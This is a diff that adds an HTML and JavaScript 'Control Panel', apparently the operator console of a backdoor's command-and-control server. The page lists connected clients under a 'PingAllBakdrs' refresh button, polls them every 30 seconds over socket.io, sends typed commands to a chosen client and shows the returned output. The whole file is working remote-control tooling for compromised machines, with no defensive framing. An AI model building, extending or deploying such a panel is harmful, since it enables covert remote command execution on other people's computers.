@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf8">
+		<title>Control Panel</title>
+		<style>
+			body{
+				background-color:rgb(35,35,35);
+				padding:0px;
+				margin:0px;
+				overflow:hidden;
+				font-family:'Courier New',Courier,monospace;
+				font-size:17px;
+			}#consoleOutput{
+				white-space:pre;
+				position:absolute;
+				top:0px;
+				left:20%;
+				width:80%;
+				height:97%;
+				color:rgb(0,255,55);
+				vertical-align:bottom;
+				overflow-y:scroll;
+			}#consoleInput{
+				font-size:17px;
+				font-family:'Courier New',Courier,monospace;
+				position:absolute;
+				top:97%;
+				left:20.2%;
+				width:79%;
+				height:3%;
+				border-style:none;
+				outline:none;
+				color:rgb(0,255,55);
+				background-color:rgb(35,35,35);
+			}code{
+				color:rgb(0,255,213);
+				font-style:italic;
+			}#clientMenuSel{
+				position:absolute;
+				top:0%;
+				left:0%;
+				width:20%;
+				height:100%;
+				border-right-style:solid;
+				border-right-width:3px;
+				border-right-color:black;
+			}#clientMenuItm{
+				color:rgb(0,255,55);
+				font-size:22px;
+				cursor:pointer;
+			}#PingAllBakdrs{
+				position:absolute;
+				top:95%;
+				left:0%;
+				width:20%;
+				height:5%;
+				color:rgb(0, 195, 255);
+				font-size:22px;
+				cursor:pointer;
+				text-align:center;
+				background-color:rgb(35,35,35);
+			}
+		</style>
+	</head>
+	<body>
+		<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+		<script src="/socket.io/socket.io.js"></script>
+		<div id="clientMenuSel"></div>
+		<div id="PingAllBakdrs" onclick="refreshClients()">Refresh Clients</div>
+		<div id="consoleOutput"></div>
+		<input id="consoleInput">
+		<script>
+			socket=io()
+			uid=null
+			tick()
+
+			function refreshClients(){
+				$('#clientMenuSel').html('')
+				socket.emit('clientPing',{'cmd':'NULL','uid':'*'})
+			}
+
+			function updateUID(client){
+				client=client.replace("~","\\")
+				uid=client
+				$('#consoleOutput').html('')
+				$('#consoleOutput').append('Connected To '+client)
+			}
+
+			socket.on('consoleReturnData',function(data){
+				$('#consoleOutput').append('<span style="white-space:pre;display:block;">'+data.result+'</span>')
+				$('#consoleOutput').scrollTop($('#consoleOutput').get(0).scrollHeight);
+			})
+
+			socket.on('newClnt',function(data){
+				$('#clientMenuSel').append('<div id="clientMenuItm" onclick="updateUID(\''+data.uid.replace("\\","~")+'\')">'+data.uid+'</div>')
+			})
+
+			$('#consoleInput').keyup(function(e){
+				if(e.keyCode==13){
+					if(uid!=null){
+						socket.emit('cmdEmit',{'cmd':$('#consoleInput').val(),'uid':uid})
+						$('#consoleInput').val('')
+					}else{
+						alert('Please Select A Client')
+					}
+				}
+			})
+
+			function tick(){
+				refreshClients()
+				setTimeout(()=>{tick()},30000)
+			}
+		</script>
+	</body>
+</html>
